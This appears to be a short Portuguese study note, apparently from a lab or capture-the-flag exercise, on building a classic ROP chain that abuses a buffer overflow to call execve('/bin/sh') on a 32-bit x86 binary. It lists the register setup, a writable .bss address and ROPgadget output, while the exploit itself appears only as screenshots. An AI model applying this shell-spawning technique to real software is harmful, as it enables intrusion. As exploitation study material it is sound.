RCE via Buffer overflow através de ROP clássico

Pegando gadgets com ROPgadget

![](/Screenshots/Pasted%20image%2020220318121603.png)

Para chamar execve("/bin/sh"):

```
EAX = 11 (0xB em hex) – número da syscall do execve
EBX = Endereço de memória da string "/bin/sh"
ECX = Endereço de um ponteiro para a string string "/bin/sh"
EDX = Null
```

Seção com permissão de escrita:

`[23] .bss NOBITS 080e62c0 09d2b8 000d1c 00 WA 0   0 32`

Gadgets úteis obtidos:

```
0x08093990 : mov eax, 7 ; ret
0x08093900 : add eax, 1 ; ret
0x080938f7 : add eax, 2 ; ret
0x08093910 : add eax, 3 ; ret

0x0804fb90 : xor eax, eax ; ret
0x080b074a : pop eax ; ret
0x08049022 : pop ebx ; ret
0x08049e39 : pop ecx ; ret
0x080583c9 : pop edx ; pop ebx ; ret
0x080b06ea : push eax ; ret
0x0806ca36 : xchg eax, edx ; ret
0x08055e3e : mov eax, edx ; ret
0x0809e5d8 : mov dword ptr [eax], edx ; ret
0x08059102 : mov dword ptr [edx], eax ; ret  	//write to memory
0x0808f8f8 : mov dword ptr [eax + 0x20], ecx ; ret
0x0804a3d2 int 0x80
0x08071650 : int 0x80 ; ret
```

Exploit feito com os gadgets:

![](/Screenshots/Pasted%20image%2020220318121649.png)

![](/Screenshots/Pasted%20image%2020220318121718.png)

